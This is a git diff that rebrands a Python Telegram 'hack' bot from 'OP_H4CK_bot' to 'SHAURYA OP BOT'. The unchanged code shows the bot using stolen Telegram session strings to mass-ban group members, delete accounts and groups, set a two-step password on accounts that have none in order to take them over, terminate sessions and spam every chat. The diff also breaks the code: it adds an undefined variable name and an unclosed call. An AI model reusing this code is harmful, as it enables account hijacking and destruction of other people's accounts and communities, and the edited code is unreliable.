@@ -511,7 +511,7 @@ async def users(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using OP_H4CK_bot. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using SHAURYA OP ✨BOT❤️. \n/hack", buttons=keyboard)
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -524,7 +524,7 @@ async def users(event):
     else:
       return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nThanks For using SHAURYA OP Bot❤️.\n/hack", buttons=keyboard)
     
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -539,7 +539,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await userbans(strses.text, grpid.text)
-    await event.reply("Banning all members. Thanks For using OP_H4CK_bot", buttons=keyboard)
+    await event.reply("Banning all members. Thanks For using SHAURYA OP BOT❤️", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
@@ -552,7 +552,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
+      await event.reply(i + "\n\nThanks For using SHAURYA OP BOT❤️✨", buttons=keyboard)
     
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -568,7 +568,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await joingroup(strses.text, grpid.text)
-    await event.reply("Joined the Channel/Group Thanks For using OP_H4CK_bot ", buttons=keyboard)
+    await event.reply("Joined the Channel/Group Thanks For using SHAURYA OP BOT❤️✨ ", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
@@ -583,7 +583,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await leavegroup(strses.text, grpid.text)
-    await event.reply("Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard)
+    await event.reply("Leaved the Channel/Group Thanks For using SHAURYA OP BOT❤️✨,", buttons=keyboard)
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
@@ -597,7 +597,7 @@ async def users(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using OP_H4CK_bot.", buttons=keyboard)
+      await event.reply("Deleted the Channel/Group Thanks For using SHAURYA OP BOT❤️✨.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -611,7 +611,7 @@ async def users(event):
         return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `OP_H4CK_bot Is best` you can login now\n\nThanks For using OP_H4CK_bot.", buttons=keyboard)
+        await event.reply("User don't have two step thats why now two step is `SHAURYA OP BOT❤️✨ Is best` you can login now\n\nThanks For using SHAURYA OP BOT❤️✨.", buttons=keyboard)
       else:
         await event.reply("Sorry User Have two step already", buttons=keyboard)
 
@@ -626,7 +626,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using OP_H4CK_bot.", buttons=keyboard)
+      await event.reply("The all sessions are terminated\n\nThanks For using SHAURYA OP BOT❤️✨.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -639,7 +639,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using OP_H4CK_bot .", buttons=keyboard)
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using SHAURYA OP BOT❤️✨.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
 async def users(event):
@@ -656,7 +656,7 @@ async def users(event):
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using OP_H4CK_bot.", buttons=keyboard)
+      await event.reply("I am Promoting you in Group/Channel wait a min 🔥❤️💋\n\nThanks For Using SHAURYA OP BOT❤️✨.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
 async def users(event):
@@ -674,7 +674,7 @@ async def users(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using OP_H4CK_bot.", buttons=keyboard)
+      await event.reply("I am Demoting all members of Group/Channel wait a min 🔥❤️💋\n\nThanks For using SHAURYA OP BOT❤️✨.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
 async def users(event):
@@ -702,7 +702,7 @@ async def users(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @team_shaurya\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @team_shaurya_group\n**LOGS**\n" + str(e))
 
 
 
@@ -774,7 +774,7 @@ async def users(event):
       msg = await x.get_response()
       await x.send_message("Now Done It Will Send message automatically every 10 min")
       i = await gcasta(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using OP_H4CK_bot.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} all 🔥❤️💋\n\nThanks For Using SHAURYA OP BOT❤️✨.", buttons=keyboard)
 
 molb = True
 
@@ -898,7 +898,7 @@ async def users(event):
       msg = await x.get_response()
       await x.send_message("Now Done It Will Send message automatically every 10 min")
       i = await gcastb(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using OP_H4CK_bot.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} Group 🔥❤️💋\n\nThanks For Using SHAURYA OP BOT❤️✨ .", buttons=keyboard)
 
 async def gcastc(strses, msg):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -907,7 +907,7 @@ async def gcastc(strses, msg):
             tol = reply_msg
             file = None
             async for shaurya in X.iter_dialogs():
-                if krishna.is_user and not krishna.entity.bot:
+                if Shaurya.is_user and not krishna.entity.bot:
                     chat = shaurya.id
                     try:
                         await X.send_message(chat, tol, file=file)
@@ -933,7 +933,9 @@ async def users(event):
       msg = await x.get_response()
       await x.send_message("Now Done It Will Send message automatically every 10 min")
       i = await gcastc(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using OP_H4CK_bot.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} Private🔥💋🔥\n\nThanks For Using SHAURYA OP BOT❤️✨.", buttons=keyboard
 
-print("🌟❤️ Bot Deploy Successfully 🔥❤️")
+
+
+print("🌟❤️ Shaurya hack Bot Deploy Successfully 🔥❤️")
 client.run_until_disconnected()
